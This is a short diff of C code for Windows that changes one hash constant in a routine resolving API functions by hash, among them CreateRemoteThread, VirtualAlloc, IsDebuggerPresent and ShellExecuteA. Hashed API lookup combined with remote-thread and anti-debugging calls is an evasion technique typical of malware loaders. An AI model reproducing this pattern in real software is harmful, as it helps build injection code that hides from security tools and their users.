@@ -102,7 +102,7 @@ int main() {
     DWORD hash_CreateRemoteThread = 0x00844e304;   // Hash for "CreateRemoteThread"
     DWORD hash_VirtualAlloc = 0x0055f63c3;         // Hash for "VirtualAlloc"
     DWORD hash_IsDebuggerPresent = 0x00847b534;    // Hash for "IsDebuggerPresent"
-    DWORD hash_ShellExecute = 0x00673a4e5;         // Hash for "ShellExecuteA"
+    DWORD hash_ShellExecute = 0x006778961;         // Hash for "ShellExecuteA"
 
     // Load and resolve the functions by their hashes
     PFN_CreateThread CreateThread = (PFN_CreateThread)getFunctionAddressByHash((char *)"kernel32.dll", hash_CreateThread);
